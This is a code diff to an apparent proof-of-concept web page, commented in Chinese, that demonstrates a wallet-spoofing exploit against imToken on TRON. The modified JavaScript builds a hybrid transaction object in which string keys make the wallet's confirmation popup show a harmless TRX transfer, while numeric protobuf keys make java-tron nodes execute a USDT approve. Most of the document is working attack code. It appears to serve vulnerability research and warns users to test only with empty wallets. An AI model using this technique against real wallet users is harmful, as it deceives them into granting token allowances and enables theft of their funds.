@@ -42,9 +42,9 @@
       ② <span class="highlight-green">原始 USDT approve</span> — 验证合约调用可正常上链<br>
       ③ <span class="highlight-red">混合攻击</span> — 弹窗显示 TRX 转账，实际签署并广播 USDT approve<br>
       <br>
-      攻击原理：imToken 的 <code>tron.sendTransaction</code> API 不校验 <code>raw_data</code> 与 <code>raw_data_hex</code> 是否一致<br>
-      钱包确认页从 <code>raw_data.contract[0].type</code> 读取交易类型展示，但签名基于 <code>raw_data_hex</code> 字节<br>
-      <span style="color:var(--orange);">⚠️ 是否受影响取决于 imToken 具体版本和平台。核心前提是钱包不重新序列化 raw_data。</span>
+      攻击原理：同一个 contract 对象包含两套字段 — 字符串键给 imToken UI 读取，数字键给 java-tron 节点解析<br>
+      <code>type</code>/<code>parameter</code> 显示 TRX 转账，数字键 <code>"1"</code>/<code>"2"</code> 覆盖为 TriggerSmartContract<br>
+      <span style="color:var(--orange);">⚠️ 是否受影响取决于 imToken 版本和 java-tron 节点对数字字段号的支持。</span>
     </div>
     <div class="warning-box">
       ⚠️ 所有按钮均会真实签名并广播交易，请务必使用无资产测试钱包。
@@ -263,10 +263,10 @@
       );
       if (!result?.result) { log('approve 生成失败', 'error'); return; }
 
+      // 保存 approve 的原始 contract（parameter 即 realParam）
       const realParam = transaction.raw_data.contract[0].parameter;
-      const originalHex = transaction.raw_data_hex;
 
-      // Step 2: 构建假的 TransferContract（给钱包确认页看）
+      // Step 2: 构建假的 TransferContract 参数（给钱包确认页看）
       const fakeParam = {
         type_url: 'type.googleapis.com/protocol.TransferContract',
         value: {
@@ -277,23 +277,26 @@
         }
       };
 
-      // Step 3: 替换 contract[0] — 欺骗钱包 UI
-      // 钱包读取 type + parameter → 显示 TRX 转账
-      // raw_data_hex 保持 approve 字节 → 钱包基于此签名
+      // Step 3: 混合 contract 对象 — 同时包含字符串键和数字键
+      // imToken 确认页读取 type / parameter → 显示 TRX 转账
+      // java-tron 节点 JSON→Protobuf 解析器同时接受字段名和数字字段号
+      // Protobuf: Contract.type=字段1, Contract.parameter=字段2, TriggerSmartContract=31
       transaction.raw_data.contract[0] = {
-        type: 'TransferContract',
-        parameter: fakeParam
+        type: 'TransferContract',        // imToken 确认页读取
+        parameter: fakeParam,            // imToken 确认页读取
+        '1': 'TriggerSmartContract',     // java-tron 节点按字段号读取
+        '2': realParam                   // java-tron 节点按字段号读取
       };
-      transaction.raw_data_hex = originalHex;
 
-      const hasSelector = originalHex.includes('095ea7b3');
+      // 关键：不覆盖 raw_data_hex！让它保持 triggerSmartContract 生成的原值
+      // raw_data_hex 本身已是 approve 字节，与数字键指向的 TriggerSmartContract 一致
+      const hasSelector = transaction.raw_data_hex.includes('095ea7b3');
       log(`raw_data_hex 包含 approve 选择器 (095ea7b3): ${hasSelector}`, hasSelector ? 'success' : 'error');
-      log('✔ raw_data.contract[0] 已改为 TransferContract — 钱包将显示 TRX 转账', 'success');
-      log('✔ raw_data_hex 保留原始 approve 字节 — 签名基于此数据', 'success');
-      log('⚠ 发送后若出现 SIGERROR，说明钱包签了 approve 但节点从 raw_data 重建了 TransferContract', 'warn');
-      log('⚠ 弹窗截图 + 此日志即为漏洞证据', 'warn');
+      log('✔ raw_data.contract[0] 字符串键 → TransferContract（钱包显示 TRX 转账）', 'success');
+      log('✔ raw_data.contract[0] 数字键 → TriggerSmartContract（节点解析 approve）', 'success');
+      log('✔ raw_data_hex 未覆盖，保持原始 approve 字节', 'success');
 
-      // Step 4: 调用 sendTransaction — 弹窗显示 TRX 转账
+      // Step 4: 调用 sendTransaction
       const ok = await sendTx(transaction, '混合攻击 (approve)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
